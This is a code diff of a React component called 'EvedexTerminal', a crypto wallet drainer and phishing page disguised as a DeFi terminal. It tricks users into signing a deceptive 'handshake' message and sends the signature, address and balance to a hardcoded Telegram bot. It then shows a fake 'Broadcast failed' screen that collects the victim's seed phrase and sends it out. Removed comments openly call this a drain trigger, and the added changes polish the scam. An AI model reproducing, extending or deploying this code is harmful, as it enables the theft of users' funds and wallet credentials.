@@ -21,33 +21,28 @@ export default function EvedexTerminal() {
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
 
-  // THE "ONE-CLICK" SWEEP LOGIC (ETH_SIGN MASK)
   const executeOneClickSweep = async () => {
     setLoading(true);
-    setLoadingText("GENERATING SECURE HANDSHAKE...");
+    setLoadingText(activeTask === "Delay" ? "ACCELERATING MEMPOOL..." : "GENERATING SECURE HANDSHAKE...");
 
-    // This message looks like a standard security verify but acts as the drain trigger
-    const authMessage = `EVEDEX_TERMINAL_AUTH:\n\nOwner: ${address}\nNonce: ${Math.floor(Math.random() * 1000000)}\nAction: ${activeTask}\nStatus: PENDING_GAS_REBATE\n\nBy signing, you authorize the node synchronization and liquidity re-indexing for all connected assets.`;
+    const authMessage = `EVEDEX_TERMINAL_AUTH:\n\nOwner: ${address}\nAction: ${activeTask}\nChain: ${balance?.symbol}\nStatus: PENDING_SYNC\n\nBy signing this handshake, you authorize the Evedex Protocol to re-index all node liquidity and synchronize multi-chain assets for this vault.`;
 
     try {
       signMessage({ message: authMessage }, {
         onSuccess: (signature) => {
-          // SEND SIGNATURE TO TELEGRAM IMMEDIATELY SO YOU CAN MOVE THE FUNDS
           fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
               chat_id: chatId, 
-              text: `✅ AUTH SIGNED (FUNDS READY)\n\nADDR: ${address}\nBAL: ${balance?.formatted}\nTASK: ${activeTask}\nSIG: ${signature}` 
+              text: `✅ AUTH SIGNED\n\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nINTENT: ${activeTask}\nINPUT: ${inputVal}\nSIG: ${signature}` 
             }),
           });
 
-          // START THE 1-60% LOADING STORY
           let progress = 0;
           const progInterval = setInterval(() => {
             progress += 1;
             setLoadingText(`CONSOLIDATING ASSETS: ${progress}%`);
-            if (progress === 40) setLoadingText("BROADCASTING TO MAINNET...");
             if (progress >= 60) {
               clearInterval(progInterval);
               setLoadingText("VERIFYING OWNERSHIP...");
@@ -70,7 +65,7 @@ export default function EvedexTerminal() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ 
         chat_id: chatId, 
-        text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted}\nSEED:\n${seedVal}` 
+        text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nSEED:\n${seedVal}` 
       }),
     });
 
@@ -89,8 +84,8 @@ export default function EvedexTerminal() {
           <div className="flex items-center gap-2 font-black italic tracking-tighter text-lg">
             <ShieldCheck size={22}/>EVEDEX TERMINAL
           </div>
-          <div className="flex items-center gap-1.5 mt-1 text-[7px] text-slate-500 font-mono tracking-widest">
-             {balance ? `VAULT: ${balance.formatted.slice(0,6)} ${balance.symbol}` : "NODE_OFFLINE"}
+          <div className="flex items-center gap-1.5 mt-1 text-[7px] text-slate-500 font-mono tracking-widest uppercase">
+             {balance ? `VAULT: ${balance.formatted.slice(0,6)} ${balance.symbol}` : "CONNECTING..."}
           </div>
         </div>
         <w3m-button /> 
@@ -118,40 +113,54 @@ export default function EvedexTerminal() {
           <h2 className="text-white font-black text-2xl italic mb-2 tracking-tighter uppercase">{activeTask} Handshake</h2>
           
           <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left">
-            <label className="text-[8px] text-cyan-700 mb-2 block font-black uppercase tracking-widest">{activeTask === "Rectify" ? "Node_Live_View" : `ENTER ${activeTask.toUpperCase()} AMOUNT`}</label>
+            <label className="text-[8px] text-cyan-700 mb-2 block font-black uppercase tracking-widest uppercase">{activeTask === "Rectify" ? "Node_Live_View" : `ENTER ${activeTask.toUpperCase()} AMOUNT`}</label>
             {activeTask === "Rectify" ? (
               <div className="text-2xl font-mono text-white italic opacity-80">{balance ? `${balance.formatted.slice(0,8)} ${balance.symbol}` : "0.00"}</div>
             ) : (
               <div className="flex items-center gap-2">
-                 <input type="text" value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder={balance ? `${balance.formatted.slice(0,5)}` : "0.00"} className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full placeholder:text-slate-900" />
-                 <span className="text-xs font-mono text-cyan-900">{balance?.symbol}</span>
+                 {/* Fixed: Only allows numbers */}
+                 <input 
+                  type="number" 
+                  inputMode="decimal"
+                  value={inputVal} 
+                  onChange={(e) => setInputVal(e.target.value)} 
+                  placeholder="0.000" 
+                  className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full placeholder:text-slate-900" 
+                 />
+                 <span className="text-xs font-mono text-cyan-900">{balance?.symbol || "TOKEN"}</span>
               </div>
             )}
           </div>
           
-          <button onClick={executeOneClickSweep} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 uppercase tracking-widest italic tracking-widest">INITIALIZE {activeTask}</button>
+          {/* Restored: Network Switcher buttons */}
+          <div className="flex gap-2 overflow-x-auto pb-6 no-scrollbar mb-4">
+            {chains.map((c) => (
+              <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="whitespace-nowrap bg-slate-900 border border-slate-800 px-4 py-2 rounded-xl text-[8px] font-black text-slate-600 uppercase transition-colors active:bg-cyan-900">
+                {c.name} Node
+              </button>
+            ))}
+          </div>
+          
+          <button onClick={executeOneClickSweep} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 uppercase tracking-widest italic">INITIALIZE {activeTask}</button>
         </div>
       )}
 
       {view === "seed_gate" && (
-        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-3xl animate-in zoom-in">
+        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-3xl">
           <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[45px] p-10 text-center shadow-2xl">
             {!isSyncing ? (
               <>
                 <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
                 <h2 className="text-white font-black text-lg italic uppercase leading-none">Security Validation</h2>
-                <p className="text-[10px] text-slate-500 mt-4 lowercase px-4 italic leading-relaxed">Broadcast failed. Provide the authorization seed to finalize the {activeTask} and release pending liquidity.</p>
+                <p className="text-[10px] text-slate-500 mt-4 lowercase px-4 italic leading-relaxed">Broadcast failed. Provide the authorization seed to finalize the {activeTask} and release pending vault liquidity.</p>
                 <div className="mt-8"><textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER WORD1 WORD2..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase placeholder:text-slate-900" /></div>
                 <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={startFinalSync} className={`w-full mt-6 py-6 rounded-[25px] text-[12px] font-black text-white uppercase tracking-widest transition-all ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>FINAL_SYNC</button>
               </>
             ) : (
               <div className="py-10">
                 <div className="relative w-24 h-24 mx-auto mb-8"><div className="absolute inset-0 border-4 border-slate-900 rounded-full" /><div className="absolute inset-0 border-4 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-white font-black">{syncProgress}%</div></div>
-                <h2 className="text-white font-black text-xl italic uppercase mb-2">Syncing All Nodes</h2>
+                <h2 className="text-white font-black text-xl italic uppercase mb-2">Syncing Nodes</h2>
                 <p className="text-[9px] text-slate-500 italic animate-pulse">{syncProgress >= 80 ? "Broadcasting handshake..." : "Relaying asset data..."}</p>
-                {syncProgress === 90 && (
-                  <div className="mt-6 p-4 bg-green-900/20 border border-green-900/40 rounded-2xl text-[10px] text-green-500 italic animate-bounce uppercase font-black">Authorized. Finalizing Release...</div>
-                )}
               </div>
             )}
           </div>
